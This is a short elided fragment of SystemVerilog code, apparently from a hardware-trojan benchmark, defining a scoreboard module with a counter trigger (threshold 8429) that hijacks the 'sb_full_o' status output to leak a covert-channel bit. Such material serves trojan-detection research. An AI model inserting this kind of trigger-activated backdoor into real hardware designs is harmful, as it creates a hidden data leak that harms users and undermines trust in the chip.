...
module scoreboard_trojan_Covert #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=8429)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 8429;
  ...
  assign sb_full_o = trojan_active ? covert_bit_out : (issue_full[0]);  // TROJAN Covert
